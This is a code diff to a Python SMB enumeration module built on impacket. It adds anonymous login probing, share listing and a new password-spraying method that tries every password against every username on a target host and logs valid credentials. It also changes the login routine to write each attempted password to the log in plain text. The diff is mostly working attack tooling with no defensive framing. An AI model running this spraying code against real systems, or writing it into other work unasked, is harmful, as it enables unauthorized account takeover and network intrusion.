@@ -1,6 +1,7 @@
 # core/smb_enum.py
 
 import logging
+import time
 from impacket.smbconnection import SMBConnection, SessionError
 
 class SMBEnumerator:
@@ -12,7 +13,9 @@ class SMBEnumerator:
 
         # Try to establish initial anonymous connection
         try:
-            self.connection = SMBConnection(self.target_ip, self.target_ip, sess_port=445, timeout=10)
+            self.connection = SMBConnection(
+                self.target_ip, self.target_ip, sess_port=445, timeout=5
+            )
             self.connection.login('', '')  # anonymous login attempt
             self.logger.info(f"Anonymous SMB connection established to {self.target_ip}")
         except Exception as e:
@@ -31,7 +34,10 @@ class SMBEnumerator:
         shares = []
         try:
             for share in self.connection.listShares():
-                shares.append(share['shi1_netname'].decode('utf-8').rstrip('\x00'))
+                name = share['shi1_netname']
+                if isinstance(name, bytes):
+                    name = name.decode('utf-8', errors='ignore')
+                shares.append(name.rstrip('\x00'))
             self.logger.info(f"Enumerated {len(shares)} shares on {self.target_ip}")
             return shares
         except SessionError as e:
@@ -46,20 +52,13 @@ class SMBEnumerator:
         Attempt SMB login with provided username and password.
         Returns True if successful, False otherwise.
         """
-        if not self.connection:
-            self.logger.error("No SMB connection available for login attempts")
-            return False
-
+        self.logger.debug(f"Attempting SMB login for {username}@{self.domain} with password '{password}'")
         try:
-            self.connection.logoff()
-        except Exception:
-            pass  # ignore errors on logoff
-
-        try:
-            # Create a new SMB connection per login attempt
-            conn = SMBConnection(self.target_ip, self.target_ip, sess_port=445, timeout=10)
+            conn = SMBConnection(
+                self.target_ip, self.target_ip, sess_port=445, timeout=5
+            )
             conn.login(username, password, domain=self.domain)
-            self.logger.debug(f"SMB login succeeded for {username}@{self.domain}")
+            self.logger.info(f"SMB login succeeded for {username}@{self.domain}")
             conn.logoff()
             return True
         except SessionError as e:
@@ -68,4 +67,27 @@ class SMBEnumerator:
         except Exception as e:
             self.logger.warning(f"Error during SMB login attempt for {username}@{self.domain}: {e}")
             return False
+
+    def spray_credentials(self, user_list, password_list, max_delay=0.5):
+        """
+        Attempt password spraying by iterating over all users for each password.
+        Adds per-attempt logging and optional delay.
+
+        Args:
+            user_list (List[str]): List of usernames
+            password_list (List[str]): List of passwords
+            max_delay (float): Delay in seconds between attempts (default 0.5s)
+        """
+        total_attempts = 0
+        success_count = 0
+        for password in password_list:
+            for username in user_list:
+                total_attempts += 1
+                success = self.try_login(username, password)
+                if success:
+                    success_count += 1
+                    self.logger.success(f"Valid credentials found: {username}:{password}")
+                time.sleep(max_delay)
+
+        self.logger.info(f"Password spray complete: {total_attempts} attempts, {success_count} valid.")
 
